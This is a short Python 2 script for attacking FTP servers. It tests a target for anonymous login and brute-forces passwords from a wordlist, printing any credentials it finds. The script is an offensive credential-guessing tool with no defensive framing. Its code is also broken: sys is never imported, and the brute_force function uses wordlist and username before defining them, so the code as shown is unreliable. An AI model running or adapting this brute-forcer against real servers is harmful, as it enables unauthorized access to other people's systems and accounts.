from ftplib import FTP

def check_anonymous_login(target):
    ftp = FTP(target)
    ftp.login()
    print "\n[+] Anonymous login is open."
    print "\n[+] Username : anonymous"
    print "\n[+] Password : anonymous\n"
    ftp.quit()

def ftp_login(target, username, password):
    try:
        ftp = FTP(target)
        ftp.login(username, password)
        ftp.quit()
        print "\n[!] Credentials have found."
        print "\n[!] Username : {}".format(username)
        print "\n[!] Password : {}".format(password)
        sys.exit(0)
    except:
        pass

def brute_force(target):
    # Fix this so it iterates through usernames and passwords in SecLists
    wordlist = open(wordlist, "r")
    words = wordlist.readlines()
    for word in words:
        word = word.strip()
        ftp_login(target, username, word)

